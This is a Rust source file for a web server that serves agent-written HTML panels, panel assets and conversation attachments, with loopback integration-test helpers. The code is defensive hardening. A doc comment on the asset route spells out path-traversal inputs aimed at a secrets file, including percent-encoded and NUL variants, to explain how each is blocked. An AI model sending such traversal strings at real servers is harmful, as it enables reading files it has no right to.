            .map_err(|e| ApiError::from(e).with_status(StatusCode::INTERNAL_SERVER_ERROR))?;
        if !q.status.open() {
            // Same granularity as `question_answer`: answered or abandoned in
            // between the list and the tap is not this route's error to
            // explain any differently.
            return Err(ApiError::conflict(format!(
                "question {} is already {}",
                q.short(),
                q.status.as_str()
            )));
        }
        // `Question::say` owns the one rule that matters here - an empty
        // message tells the agent nothing - so the route does not restate it.
        q.say(body.body).map_err(ApiError::bad_request_from)?;
        ui.questions.put(&mut q)?;
        Ok(Json(QuestionView::from(q)))
    })
    .await
}

/// Expand an id or short id to exactly one question id.
fn resolve_question(store: &Questions, id: &str) -> ApiResult<String> {
    if store.path_of(id).is_file() {
        return Ok(id.to_owned());
    }
    pick(
        store.list().into_iter().map(|q| q.id).collect(),
        id,
        "question",
    )
}

/// `GET /api/questions/{id}/panel`.
///
/// The panel an agent wrote for this question, as `text/html` under
/// [`PANEL_CSP`], for the front end to mount in a token-less sandboxed iframe.
/// A question without one is a 404 rather than an empty page: the client
/// preflights this route with `HEAD` and must be able to tell "no panel" from
/// "a panel that rendered blank", and a sandboxed frame is opaque to the
/// parent document so it cannot tell the difference by looking.
///
/// The body is whatever the agent wrote, byte for byte. Nothing here rewrites,
/// sanitises or minifies it - a sanitiser is a list of things someone thought
/// of, and the sandbox plus the CSP is a list of things that are allowed, which
/// is the direction that stays safe when an agent writes markup nobody
/// predicted.
async fn question_panel(State(ui): State<Arc<Ui>>, Path(id): Path<String>) -> ApiResult<Response> {
    blocking(move || {
        let id = resolve_question(&ui.questions, &id)?;
        let Some(html) = ui.questions.panel_html(&id) else {
            return Err(ApiError::not_found(format!("question {id} has no panel")));
        };
        Ok(panel_response(
            "text/html; charset=utf-8",
            false,
            html.into_bytes(),
        ))
    })
    .await
}

/// `GET /api/questions/{id}/asset/{name}`.
///
/// One file from the question's own panel directory, so a panel can show a
/// diff as an SVG or a screenshot as a PNG without the CSP's `img-src 'self'`
/// having to allow anything off this machine.
///
/// This is the only route in the server where a client names a file, so it is
/// the only one with a traversal surface, and the name is checked by
/// [`ask::valid_asset_name`] before a path is built from it. Which layer stops
/// what is worth being explicit about, because the answer is not "all of it in
/// one place":
///
/// * `asset/../../secrets` never reaches this handler at all. axum matches on
///   the raw request path and `{name}` spans exactly one segment, so a real
///   slash makes the request too long for the route and the router answers 404.
/// * `asset/%2e%2e%2fsecrets` and `asset/..%5csecrets` do reach it: axum
///   percent-decodes path parameters, so `name` arrives as `../secrets` and
///   `..\secrets` respectively, which look like plain filenames to the router.
///   The validator refuses them here - both for the literal `..` and because
///   `/` and `\` are not in the permitted character set - and answers 400.
/// * A name carrying a NUL (`%00`) decodes to a string Rust is happy with but
///   the platform's path API is not, and it is refused here for the same
///   reason: NUL is not a permitted character.
/// * [`Questions::panel_asset`] validates again on read, so the check is not
///   load-bearing in only one place. This route's own check exists so the
///   failure is a 400 that says which name was wrong, rather than a store error
///   the operator has to interpret.
async fn question_asset(
    State(ui): State<Arc<Ui>>,
    Path((id, name)): Path<(String, String)>,
) -> ApiResult<Response> {
    // Before any filesystem work and before any path is built: a name this
    // server will not serve should not become a `PathBuf` at all.
    if !crate::ask::valid_asset_name(&name) {
        return Err(ApiError::bad_request(format!(
            "`{name}` is not a usable asset name"
        )));
    }
    blocking(move || {
        let id = resolve_question(&ui.questions, &id)?;
        let asset = ui
            .questions
            .panel_asset(&id, &name)
            .map_err(|e| ApiError::bad_request(format!("{e:#}")))?;
        let Some(bytes) = asset else {
            return Err(ApiError::not_found(format!(
                "question {id} has no asset `{name}`"
            )));
        };
        Ok(panel_response(
            asset_content_type(&name),
            is_svg(&name),
            bytes,
        ))
    })
    .await
}

/// Content type for a panel asset, from a closed whitelist.
///
/// A whitelist with an `application/octet-stream` fallback rather than a
/// guess, because the one answer that must never come out of here is
/// `text/html`. An agent that writes `notes.html` into its panel directory and
/// links it would otherwise get its own markup rendered at the top level of the
/// operator's browser - outside the sandboxed frame, outside [`PANEL_CSP`], on
/// magi's origin - which is precisely the thing the panel design exists to
/// prevent. Same reasoning for `.js` and `.json`: unlisted means downloaded.
///
/// `nosniff` accompanies this on every response, so a browser cannot decide it
/// knows better than the type we sent.
fn asset_content_type(name: &str) -> &'static str {
    match extension(name).as_deref() {
        Some("png") => "image/png",
        Some("jpg" | "jpeg") => "image/jpeg",
        Some("gif") => "image/gif",
        Some("webp") => "image/webp",
        Some("svg") => "image/svg+xml",
        Some("css") => "text/css; charset=utf-8",
        Some("txt") => "text/plain; charset=utf-8",
        _ => "application/octet-stream",
    }
}

/// Is this an SVG, and therefore a file that must never be opened at the top
/// level?
fn is_svg(name: &str) -> bool {
    extension(name).as_deref() == Some("svg")
}

/// Lowercased extension, or `None` for a name without one.
fn extension(name: &str) -> Option<String> {
    name.rsplit_once('.')
        .map(|(_, ext)| ext.to_ascii_lowercase())
}

/// Every panel response, with the four headers that make it safe and, for an
/// SVG, a fifth.
///
/// One function rather than a header list per handler, because a panel route
/// that forgets [`PANEL_CSP`] is not a cosmetic bug: it is the whole security
/// model gone, silently, on one of two routes. Adding a third panel route later
/// means calling this, and there is nowhere else to build a panel response.
///
/// `download` is set for SVG only. An SVG is XML that may carry `<script>`, and
/// as an `<img src>` inside the panel that script cannot run - but the asset
/// URL is also a plain URL an operator can be talked into opening in a tab,
/// where it is a document on magi's own origin. `Content-Disposition:
/// attachment` makes the browser download it instead of rendering it, which
/// closes that door without taking away the ability to draw a diff. Raster
/// images have no such execution surface and are left inline, so tapping a
/// screenshot still shows it.
fn panel_response(content_type: &'static str, download: bool, body: Vec<u8>) -> Response {
    let mut res = (
        [
            (header::CONTENT_TYPE, content_type),
            (header::CONTENT_SECURITY_POLICY, PANEL_CSP),
            (header::X_CONTENT_TYPE_OPTIONS, "nosniff"),
            (header::REFERRER_POLICY, "no-referrer"),
        ],
        body,
    )
        .into_response();
    if download {
        res.headers_mut().insert(
            header::CONTENT_DISPOSITION,
            HeaderValue::from_static("attachment"),
        );
    }
    res
}

/// A talk as the phone reads it.
///
/// Every field of [`Talk`] verbatim, plus `turn_bodies_md` - one markdown node
/// tree per entry of `turns`, in order - parsed server-side so `app.js` never
/// parses markdown itself - and the process-local `thinking` hint.
#[derive(Debug, Serialize)]
struct TalkView {
    #[serde(flatten)]
    talk: Talk,
    turn_bodies_md: Vec<Vec<md::Node>>,
    /// Whether [`Ui::begin_talk_turn`] currently holds this talk's turn in
    /// this server process.
    ///
    /// This is deliberately not durable: another server process cannot see
    /// it, and a restarted server must not claim an old turn is live. It is a
    /// progress hint rather than proof a reply landed; the transcript remains
    /// the source of truth for that.
    thinking: bool,
}

impl TalkView {
    fn new(talk: Talk, thinking: bool) -> Self {
        let turn_bodies_md = talk
            .turns
            .iter()
            .map(|turn| md::to_nodes(&turn.body, &md::ImageBase::None))
            .collect();
        Self {
            turn_bodies_md,
            thinking,
            talk,
        }
    }
}

/// `GET /api/talks/{id}`'s answer: a [`TalkView`] plus the queue tasks this
/// conversation has filed, so the phone can follow one from inside the
/// conversation that asked for it rather than hunting the Queue for a task id
/// it may not remember.
#[derive(Debug, Serialize)]
struct TalkDetailView {
    #[serde(flatten)]
    view: TalkView,
    tasks: Vec<TaskView>,
}

/// `GET /api/talks`.
///
/// Every conversation, open ones first and newest first - [`Talks::list`]'s
/// own order.
async fn talks_list(State(ui): State<Arc<Ui>>) -> ApiResult<Json<Vec<TalkView>>> {
    blocking(move || {
        Ok(Json(
            ui.talks
                .list()
                .into_iter()
                .map(|talk| {
                    let thinking = ui.is_thinking(&talk.id);
                    TalkView::new(talk, thinking)
                })
                .collect(),
        ))
    })
    .await
}

/// The body of `POST /api/talks`, all of it optional: opening a talk needs no
/// message. `repo` defaults to the server's own; `agent` to `[roles] chatter`,
/// [`talk::begin`]'s own default. Unknown fields are ignored so a newer front
/// end still opens a talk against an older binary.
#[derive(Debug, Default, Deserialize)]
#[serde(default)]
struct NewTalk {
    agent: Option<String>,
    repo: Option<PathBuf>,
}

/// `POST /api/talks` - open a conversation. Takes no agent turn: see
/// [`talk::begin`]'s doc for why there is nothing yet for one to answer.
async fn talk_post(
    State(ui): State<Arc<Ui>>,
    body: std::result::Result<Json<NewTalk>, JsonRejection>,
) -> ApiResult<impl IntoResponse> {
    // An absent body, or an empty one, is the normal way to open a talk - see
    // `NewTalk`'s doc - so a missing content type is treated the same as `{}`
    // rather than refused.
    let body = match body {
        Ok(Json(body)) => body,
        Err(JsonRejection::MissingJsonContentType(_)) => NewTalk::default(),
        Err(e) => return Err(ApiError::bad_request(e.body_text())),
    };
    let repo = body.repo.clone().unwrap_or_else(|| ui.repo.clone());
    let cfg = config_for(&repo).await?;
    let view = blocking(move || {
        let talk = talk::begin(&ui.talks, &cfg, repo, body.agent.as_deref())?;
        let thinking = ui.is_thinking(&talk.id);
        Ok(TalkView::new(talk, thinking))
    })
    .await?;
    Ok((StatusCode::CREATED, Json(view)))
}

/// `GET /api/talks/{id}`.
async fn talk_detail(
    State(ui): State<Arc<Ui>>,
    Path(id): Path<String>,
) -> ApiResult<Json<TalkDetailView>> {
    blocking(move || {
        let id = resolve_talk(&ui.talks, &id)?;
        let talk = ui.talks.get(&id)?;
        let thinking = ui.is_thinking(&talk.id);
        let tasks = talk::tasks_of(&ui.queue, &talk.id)
            .into_iter()
            .map(TaskView::from)
            .collect();
        Ok(Json(TalkDetailView {
            view: TalkView::new(talk, thinking),
            tasks,
        }))
    })
    .await
}

/// The body of `POST /api/talks/{id}/say`.
///
/// `attachments` names ids `POST /api/talks/{id}/attachments` already
/// returned - never bytes of its own - so a turn with no images just omits
/// the field, which is what an older front end still does.
#[derive(Debug, Default, Deserialize)]
#[serde(default, deny_unknown_fields)]
struct NewTalkTurn {
    text: String,
    attachments: Vec<String>,
}

/// `POST /api/talks/{id}/say` - one turn of the conversation.
///
/// Not filesystem work, and therefore not routed through [`blocking`]: this
/// route spawns an agent CLI and a turn here can run for the whole of
/// [`crate::config::Graph::timeout_talk`] - an hour by default - because a
/// research turn is expected to run commands rather than answer from what it
/// already knows. Holding an HTTP connection open that long is not a thing
/// to ask a phone to do; the operator's message is recorded and answered for
/// immediately, and the reply lands in the background, discovered through
/// the change stream's `talks_rev` the same way every other update on this
/// surface is.
async fn talk_say(
    State(ui): State<Arc<Ui>>,
    Path(id): Path<String>,
    body: std::result::Result<Json<NewTalkTurn>, JsonRejection>,
) -> ApiResult<(StatusCode, Json<TalkView>)> {
    let Json(body) = body.map_err(|e| ApiError::bad_request(e.body_text()))?;
    if body.text.trim().is_empty() && body.attachments.is_empty() {
        return Err(ApiError::bad_request("say something"));
    }

    let id = {
        let ui = Arc::clone(&ui);
        let asked = id.clone();
        blocking(move || resolve_talk(&ui.talks, &asked)).await?
    };
    // Claimed before the talk is loaded, so the record this turn appends to
    // was read after the claim and cannot be a snapshot another turn has
    // since replaced.
    let _turn = ui.begin_talk_turn(&id)?;

    let (talk, cfg) = {
        let ui = Arc::clone(&ui);
        let id = id.clone();
        blocking(move || {
            let talk = ui.talks.get(&id)?;
            let (cfg, _) = Config::discover(&talk.repo, None)?;
            Ok((talk, cfg))
        })
        .await?
    };

    // Every attachment id resolved to the metadata `talk::record` actually
    // stores, before anything is recorded - an unknown id is a 4xx that
    // names it rather than a turn silently missing an image.
    let attachments = {
        let ui = Arc::clone(&ui);
        let id = id.clone();
        let ids = body.attachments.clone();
        blocking(move || {
            ids.into_iter()
                .map(|att_id| {
                    ui.talks.attachment_meta(&id, &att_id)?.ok_or_else(|| {
                        ApiError::bad_request(format!("unknown attachment `{att_id}`"))
                    })
                })
                .collect::<ApiResult<Vec<talk::Attachment>>>()
        })
        .await?
    };

    let talks = ui.talks.clone();
    let text = {
        let mut talk = talk.clone();
        let talks = talks.clone();
        let said = body.text.clone();
        blocking(move || Ok(talk::record(&mut talk, &talks, &said, attachments)?)).await?
    };
    // Re-read so the spawned task appends to the record that now holds the
    // operator's turn, rather than to the snapshot taken before it.
    let talk = {
        let ui = Arc::clone(&ui);
        let id = id.clone();
        blocking(move || Ok(ui.talks.get(&id)?)).await?
    };
    let queued = TalkView::new(talk.clone(), ui.is_thinking(&id));
    tokio::spawn(async move {
        let _turn = _turn;
        let mut talk = talk;
        if let Err(e) = talk::respond(&mut talk, &talks, &cfg, &text).await {
            // `respond` records the failure in the transcript itself, which is
            // what the phone reads; this line is for the operator's terminal.
            tracing::warn!("talk {id} turn failed: {e:#}");
        }
    });

    // 202: the operator's message is recorded and a turn is running.
    Ok((StatusCode::ACCEPTED, Json(queued)))
}

/// `POST /api/talks/{id}/close`.
async fn talk_close(
    State(ui): State<Arc<Ui>>,
    Path(id): Path<String>,
) -> ApiResult<Json<TalkView>> {
    blocking(move || {
        let id = resolve_talk(&ui.talks, &id)?;
        let mut talk = ui.talks.get(&id)?;
        talk::close(&mut talk, &ui.talks)?;
        let thinking = ui.is_thinking(&talk.id);
        Ok(Json(TalkView::new(talk, thinking)))
    })
    .await
}

/// `POST /api/talks/{id}/reopen`.
async fn talk_reopen(
    State(ui): State<Arc<Ui>>,
    Path(id): Path<String>,
) -> ApiResult<Json<TalkView>> {
    blocking(move || {
        let id = resolve_talk(&ui.talks, &id)?;
        let mut talk = ui.talks.get(&id)?;
        talk::reopen(&mut talk, &ui.talks)?;
        let thinking = ui.is_thinking(&talk.id);
        Ok(Json(TalkView::new(talk, thinking)))
    })
    .await
}

/// `DELETE /api/talks/{id}`.
///
/// Removes the conversation's record and artifacts outright, unlike
/// [`talk_close`] which keeps the record as history. A turn already in
/// flight is not refused here the way [`run_delete`] refuses a live run:
/// [`talk::record`] and the tail of [`talk::turn`] check for themselves,
/// under [`Talks::guard`], that the record they are about to write back is
/// still there, so a delete racing a turn is safe without this route having
/// to know a turn is running at all.
async fn talk_delete(State(ui): State<Arc<Ui>>, Path(id): Path<String>) -> ApiResult<StatusCode> {
    blocking(move || {
        let id = resolve_talk(&ui.talks, &id)?;
        ui.talks.remove(&id)?;
        Ok(StatusCode::NO_CONTENT)
    })
    .await
}

/// Expand an id or short id to exactly one talk id.
fn resolve_talk(store: &Talks, id: &str) -> ApiResult<String> {
    pick(store.list().into_iter().map(|t| t.id).collect(), id, "talk")
}

/// `POST /api/talks/{id}/attachments` - upload one image to attach to a
/// future `talk-say`.
async fn talk_attachment_post(
    State(ui): State<Arc<Ui>>,
    Path(id): Path<String>,
    headers: HeaderMap,
    body: Bytes,
) -> ApiResult<(StatusCode, Json<talk::Attachment>)> {
    let mime = validate_attachment(&headers, &body)?;
    let name = filename_header(&headers);
    let data = body.to_vec();
    blocking(move || {
        let id = resolve_talk(&ui.talks, &id)?;
        let att = ui.talks.put_attachment(&id, mime, &name, &data)?;
        Ok((StatusCode::CREATED, Json(att)))
    })
    .await
}

/// `GET /api/talks/{id}/attachments/{att}` - the stored image back, for a
/// `<img>` tag in the transcript.
async fn talk_attachment_get(
    State(ui): State<Arc<Ui>>,
    Path((id, att)): Path<(String, String)>,
) -> ApiResult<Response> {
    blocking(move || {
        let id = resolve_talk(&ui.talks, &id)?;
        let Some((meta, data)) = ui.talks.read_attachment(&id, &att)? else {
            return Err(ApiError::not_found(format!(
                "talk {id} has no attachment `{att}`"
            )));
        };
        Ok(attachment_response(&meta.mime, data))
    })
    .await
}

/// Validate an attachment upload's declared `Content-Type` and the bytes
/// themselves, returning the canonical mime on success.
///
/// Two checks, both required: the header has to name one of
/// [`ATTACHMENT_MIME_WHITELIST`] (which is what keeps SVG out - it is
/// simply never in the list, active content rather than a picture, the same
/// exclusion [`asset_content_type`]'s doc explains), and the file's own
/// magic number has to agree. The second is what stops a mislabeled upload -
/// an HTML file sent as `Content-Type: image/png` - from ever reaching disk;
/// a declared type is a claim, not a fact, so it is never trusted alone.
fn validate_attachment(headers: &HeaderMap, data: &[u8]) -> ApiResult<&'static str> {
    if data.len() > ATTACHMENT_MAX_BYTES {
        return Err(ApiError::bad_request(format!(
            "attachment is {} bytes, over the {} MiB limit",
            data.len(),
            ATTACHMENT_MAX_BYTES / (1024 * 1024)
        ))
        .with_status(StatusCode::PAYLOAD_TOO_LARGE));
    }
    if data.is_empty() {
        return Err(ApiError::bad_request("attachment is empty"));
    }
    let declared = declared_mime(headers)?;
    match sniffed_mime(data) {
        Some(sniffed) if sniffed == declared => Ok(declared),
        Some(sniffed) => Err(ApiError::bad_request(format!(
            "Content-Type said `{declared}` but the file's own bytes look like `{sniffed}`"
        ))),
        None => Err(ApiError::bad_request(
            "the file's bytes do not match any accepted image format",
        )),
    }
}

/// The declared `Content-Type`, checked against [`ATTACHMENT_MIME_WHITELIST`]
/// and nothing else - parameters like `; charset=` are stripped, but the
/// value itself is not otherwise interpreted.
fn declared_mime(headers: &HeaderMap) -> ApiResult<&'static str> {
    let raw = headers
        .get(header::CONTENT_TYPE)
        .and_then(|v| v.to_str().ok())
        .unwrap_or("")
        .split(';')
        .next()
        .unwrap_or("")
        .trim()
        .to_ascii_lowercase();
    ATTACHMENT_MIME_WHITELIST
        .iter()
        .find(|&&m| m == raw)
        .copied()
        .ok_or_else(|| {
            if raw == "image/svg+xml" {
                ApiError::bad_request(
                    "SVG is not accepted: it can carry active content (e.g. a <script>), \
                     not just a picture",
                )
            } else if raw.is_empty() {
                ApiError::bad_request("Content-Type is required for an attachment upload")
            } else {
                ApiError::bad_request(format!(
                    "`{raw}` is not an accepted attachment type; use image/png, image/jpeg, \
                     image/gif or image/webp"
                ))
            }
        })
}

/// Identify an image by its magic number, independent of whatever
/// `Content-Type` claimed.
fn sniffed_mime(data: &[u8]) -> Option<&'static str> {
    if data.starts_with(b"\x89PNG\r\n\x1a\n") {
        Some("image/png")
    } else if data.starts_with(b"\xff\xd8\xff") {
        Some("image/jpeg")
    } else if data.starts_with(b"GIF87a") || data.starts_with(b"GIF89a") {
        Some("image/gif")
    } else if data.len() >= 12 && &data[0..4] == b"RIFF" && &data[8..12] == b"WEBP" {
        Some("image/webp")
    } else {
        None
    }
}

/// The operator's own filename, from [`FILENAME_HEADER`], kept only for
/// display - see [`talk::Attachment::name`]'s doc on why it never
/// contributes to a path. A missing or blank header (curl without it, an
/// older front end) falls back to a generic name rather than refusing the
/// upload over a field that is cosmetic.
fn filename_header(headers: &HeaderMap) -> String {
    headers
        .get(FILENAME_HEADER)
        .and_then(|v| v.to_str().ok())
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .unwrap_or("attachment")
        .to_owned()
}

/// Every attachment `GET` response: the mime re-validated against the same
/// closed whitelist the upload route enforces - never the string trusted
/// verbatim off disk - plus `X-Content-Type-Options: nosniff`, so a browser
/// cannot decide it knows better than the type we send. Unlike a panel asset
/// there is no [`PANEL_CSP`] here: this is a plain image the phone's own
/// document renders inline, not agent-authored HTML in a sandboxed frame.
fn attachment_response(mime: &str, body: Vec<u8>) -> Response {
    let content_type = ATTACHMENT_MIME_WHITELIST
        .iter()
        .find(|&&m| m == mime)
        .copied()
        .unwrap_or("application/octet-stream");
    (
        [
            (header::CONTENT_TYPE, content_type),
            (header::X_CONTENT_TYPE_OPTIONS, "nosniff"),
        ],
        body,
    )
        .into_response()
}

/// The configuration for a repository, read off the disk for this request.
///
/// Through [`blocking`] because discovery reads and merges several TOML files,
/// and because the alternative - caching it in [`Ui`] at startup - would mean
/// the operator's phone kept interviewing with a roster they had already
/// changed, with no way to reload it but restarting the server they are not
/// sitting in front of.
async fn config_for(repo: &FsPath) -> ApiResult<Config> {
    let repo = repo.to_path_buf();
    blocking(move || {
        let (cfg, _) = Config::discover(&repo, None)?;
        Ok(cfg)
    })
    .await
}

/// The one prefix rule, used for both runs and tasks: a leading match for a
/// full id, a trailing match for the short form an operator reads off a
/// report. Written here rather than borrowed from `queue::resolve_id` because
/// the UI needs the two failures as different status codes, and telling them
/// apart from an error message is not something to build a route on.
fn pick(ids: Vec<String>, prefix: &str, what: &str) -> ApiResult<String> {
    let mut hits = ids
        .into_iter()
        .filter(|id| id.starts_with(prefix) || id.ends_with(prefix));
    match (hits.next(), hits.next()) {
        (Some(one), None) => Ok(one),
        (None, _) => Err(ApiError::not_found(format!("no {what} matches `{prefix}`"))),
        (Some(a), Some(b)) => Err(ApiError::bad_request(format!(
            "`{prefix}` matches more than one {what}, including {a} and {b}"
        ))),
    }
}

#[cfg(test)]
mod tests {
    use pretty_assertions::assert_eq;
    use serde_json::Value;
    use tempfile::TempDir;
    use tokio::io::{AsyncReadExt as _, AsyncWriteExt as _};

    use super::*;
    use crate::config::Config;
    use crate::queue::{Source, TaskStatus};

    /// A home with a queue and a runs directory, and a router serving it on
    /// loopback. `tower`'s `oneshot` is not reachable - `tower` is axum's
    /// dependency, not ours - so the tests drive a real socket, which has the
    /// side benefit of asserting the status line and content types the phone
    /// actually receives.
    struct Fixture {
        home: TempDir,
        addr: SocketAddr,
    }

    impl Fixture {
        async fn start() -> Self {
            Self::with_loop(launch_idle).await
        }

        /// A fixture whose loop is `launch`.
        async fn with_loop(launch: Launch) -> Self {
            let home = TempDir::new().expect("temp home");
            let addr = Self::serve(home.path(), PathBuf::from("/repo/magi"), launch).await;
            Self { home, addr }
        }

        /// A fixture whose `ui.repo` is a real directory rather than the
        /// usual placeholder - for the routes that read config off it
        /// (`GET /api/repos`) and would otherwise have nothing to discover.
        async fn with_repo(repo: PathBuf) -> Self {
            let home = TempDir::new().expect("temp home");
            let addr = Self::serve(home.path(), repo, launch_idle).await;
            Self { home, addr }
        }

        async fn serve(home: &FsPath, repo: PathBuf, launch: Launch) -> SocketAddr {
            let queue = Queue::at(home.join("queue"));
            let runs = home.join("runs");
            std::fs::create_dir_all(&runs).expect("runs dir");
            let worktrees = home.join("wt").join("magi");
            std::fs::create_dir_all(&worktrees).expect("worktrees dir");
            let ui = Ui::new(
                queue,
                Questions::at(home.join("questions")),
                Talks::at(home.join("talks")),
                runs,
                home.to_path_buf(),
                repo,
            )
            .with_worktrees_root(worktrees)
            .with_launch(launch);
            let listener = tokio::net::TcpListener::bind((Ipv4Addr::LOCALHOST, 0))
                .await
                .expect("bind loopback");
            let addr = listener.local_addr().expect("local addr");
            tokio::spawn(async move {
                let _ = axum::serve(listener, ui.router()).await;
            });
            addr
        }

        fn queue(&self) -> Queue {
            Queue::at(self.home.path().join("queue"))
        }

        fn questions(&self) -> Questions {
            Questions::at(self.home.path().join("questions"))
        }

        fn talks(&self) -> Talks {
            Talks::at(self.home.path().join("talks"))
        }

        fn runs(&self) -> PathBuf {
            self.home.path().join("runs")
        }

        async fn get(&self, path: &str) -> Res {
            request(self.addr, "GET", path, None).await
        }

        /// The status and headers without the body, which is how the front end
        /// preflights a panel: a sandboxed frame is opaque to the parent
        /// document, so the only way to tell "no panel" from "a panel that
        /// rendered blank" is to ask before mounting.
        async fn head(&self, path: &str) -> Res {
            request(self.addr, "HEAD", path, None).await
        }

        async fn post(&self, path: &str, body: Option<&str>) -> Res {
            request(self.addr, "POST", path, body).await
        }

        async fn get_with(&self, path: &str, extra: &[(&str, &str)]) -> Res {
            request_with(self.addr, "GET", path, None, extra).await
        }

        async fn delete(&self, path: &str) -> Res {
            request(self.addr, "DELETE", path, None).await
        }

        /// `POST` a raw body with its own headers - see [`request_bytes`].
        async fn post_bytes(&self, path: &str, headers: &[(&str, &str)], body: &[u8]) -> Res {
            request_bytes(self.addr, path, headers, body).await
        }
    }

    struct Res {
        status: u16,
        headers: String,
        /// The header block with its original casing, for the assertions that
        /// compare a header *value* rather than looking for a name. Lowercasing
        /// a CSP would hide a directive spelled with a capital letter, and the
        /// whole point of that test is that the string is exactly right.
        head: String,
        body: String,
        /// The body before any UTF-8 handling, for the routes that serve
        /// something other than text. A panel asset is a PNG as often as not,
        /// and `from_utf8_lossy` would silently replace half of it.
        bytes: Vec<u8>,
    }

    impl Res {
        fn json(&self) -> Value {
            serde_json::from_str(&self.body)
                .unwrap_or_else(|e| panic!("body is not json ({e}): {}", self.body))
        }

        /// One header's value verbatim, or `None` when it was not sent.
        fn header(&self, name: &str) -> Option<&str> {
            self.head.lines().find_map(|line| {
                let (key, value) = line.split_once(':')?;
                key.trim()
                    .eq_ignore_ascii_case(name)
                    .then(|| value.trim_start().trim_end_matches('\r'))
            })
        }
    }

    /// A one-shot HTTP/1.1 client. `Connection: close` is what lets the reply
    /// be read to end-of-stream without parsing framing.
    async fn request(addr: SocketAddr, method: &str, path: &str, body: Option<&str>) -> Res {
        request_with(addr, method, path, body, &[]).await
    }

    /// As [`request`], with extra request headers - conditional GETs need
    /// `If-None-Match`, and a server that sets an `ETag` it never compares is
    /// worse than one that sets none.
    async fn request_with(
        addr: SocketAddr,
        method: &str,
        path: &str,
        body: Option<&str>,
        extra: &[(&str, &str)],
    ) -> Res {
        let mut head = format!("{method} {path} HTTP/1.1\r\nHost: magi\r\nConnection: close\r\n");
        for (name, value) in extra {
            head.push_str(&format!("{name}: {value}\r\n"));
        }
        if let Some(body) = body {
            head.push_str("Content-Type: application/json\r\n");
            head.push_str(&format!("Content-Length: {}\r\n", body.len()));
        }
        head.push_str("\r\n");
        if let Some(body) = body {
            head.push_str(body);
        }
        let mut socket = tokio::net::TcpStream::connect(addr)
            .await
            .expect("connect to the test server");
        socket
            .write_all(head.as_bytes())
            .await
            .expect("write request");
        let mut raw = Vec::new();
        socket.read_to_end(&mut raw).await.expect("read response");
        // Split on the raw bytes rather than on a lossy string, so a binary
        // body survives to be compared byte for byte.
        let split = raw
            .windows(4)
            .position(|w| w == b"\r\n\r\n")
            .expect("a header block");
        let head = String::from_utf8_lossy(&raw[..split]).into_owned();
        let bytes = raw[split + 4..].to_vec();
        let status = head
            .lines()
            .next()
            .and_then(|line| line.split_whitespace().nth(1))
            .and_then(|code| code.parse().ok())
            .expect("a status line");
        Res {
            status,
            headers: head.to_lowercase(),
            head,
            body: String::from_utf8_lossy(&bytes).into_owned(),
            bytes,
        }
    }

    /// A `POST` carrying a raw binary body and its own headers, for the
    /// attachment upload route - `request_with` only ever sends
    /// `Content-Type: application/json`, which is wrong for an image and
    /// would corrupt anything not valid UTF-8 by round-tripping it through
    /// `&str` first.
    async fn request_bytes(
        addr: SocketAddr,
        path: &str,
        headers: &[(&str, &str)],
        body: &[u8],
    ) -> Res {
        let mut head = format!("POST {path} HTTP/1.1\r\nHost: magi\r\nConnection: close\r\n");
        for (name, value) in headers {
            head.push_str(&format!("{name}: {value}\r\n"));
        }
        head.push_str(&format!("Content-Length: {}\r\n\r\n", body.len()));
        let mut socket = tokio::net::TcpStream::connect(addr)
            .await
            .expect("connect to the test server");
        socket
            .write_all(head.as_bytes())
            .await
            .expect("write request head");
        socket.write_all(body).await.expect("write request body");
        let mut raw = Vec::new();
        socket.read_to_end(&mut raw).await.expect("read response");
        let split = raw
            .windows(4)
            .position(|w| w == b"\r\n\r\n")
            .expect("a header block");
        let head = String::from_utf8_lossy(&raw[..split]).into_owned();
        let bytes = raw[split + 4..].to_vec();
        let status = head
            .lines()
            .next()
            .and_then(|line| line.split_whitespace().nth(1))
            .and_then(|code| code.parse().ok())
            .expect("a status line");
        Res {
            status,
            headers: head.to_lowercase(),
            head,
            body: String::from_utf8_lossy(&bytes).into_owned(),
            bytes,
        }
    }

    /// A run on disk, without touching the process-global magi home.
    fn write_run(runs: &FsPath, id: &str, status: RunStatus) {
        let mut state = RunState::new(
            PathBuf::from("/repo/magi"),
            "main".to_owned(),
            "0123456789abcdef".to_owned(),
            "Add a web UI\n\nMobile first.".to_owned(),
            Config::default(),
        );
        state.id = id.to_owned();
        state.status = status;
        let dir = runs.join(id);
        std::fs::create_dir_all(&dir).expect("run dir");
        std::fs::write(
            dir.join("run.json"),
            serde_json::to_string_pretty(&state).expect("serialize run"),
        )
        .expect("write run.json");
    }

    fn write_daemon(home: &FsPath, updated_at: Timestamp) {
        let body = serde_json::json!({
            "schema": 1,
            "pid": 4242,
            "started_at": Timestamp::now().to_string(),
            "updated_at": updated_at.to_string(),
            "idle": false,
            "current": [{ "task": "20260902-140501-aaaa", "run": "20260902-140502-bbbb" }],
            "completed": 7,
            "polls": 143,
        });
        std::fs::write(home.join("daemon.json"), body.to_string()).expect("write daemon.json");
    }

    /// A loop that starts, finds nothing to do, and waits to be told to stop.
    ///
    /// No test in this file may start the real loop - see [`Ui::launch`] for
    /// why - so this stands in for the only thing the routes need a loop to
    /// do: keep running until `Stop` is set, then return. A real
    /// `serve_until` here would resolve its queue and its status file through
    /// the process-global magi home, claim whatever it found in the
    /// operator's live backlog, overwrite the status file of the `magi serve`
    /// that owns it, and spend real agent quota on a real competition.
    fn launch_idle(
        _opts: daemon::Opts,
        stop: daemon::Stop,
    ) -> Pin<Box<dyn Future<Output = Result<()>> + Send>> {
        Box::pin(async move {
            while !stop.stopped() {
                tokio::time::sleep(Duration::from_millis(2)).await;
            }
            Ok(())
        })
    }

    /// A loop that fails on the way up, the way one whose home has gone
    /// read-only does.
    fn launch_broken(
        _opts: daemon::Opts,
        _stop: daemon::Stop,
    ) -> Pin<Box<dyn Future<Output = Result<()>> + Send>> {
        Box::pin(async {
            Err(anyhow::anyhow!(
                "publish the daemon status file: read-only file system"
            ))
        })
    }

    /// The address the parking loop knocks on, and what it heard there.
    ///
    /// A [`Launch`] is a plain function pointer, so a stand-in loop cannot
    /// capture a fixture's address; this is how it is handed one. Only
    /// `the_deck_answers_while_it_parks_and_frees_the_address_first` touches
    /// these, so nothing else in this binary can race them.
    static PARK_KNOCK: std::sync::Mutex<Option<SocketAddr>> = std::sync::Mutex::new(None);
    static PARK_HEARD: std::sync::Mutex<Option<u16>> = std::sync::Mutex::new(None);

    /// A loop that, once it is asked to stop, checks the deck still answers
    /// before it goes.
    ///
    /// It stands in for a run mid-node: `finish_loop` waits for this future,
    /// so the request it makes is strictly inside the park window - no sleep
    /// and no polling needed to be sure of that.
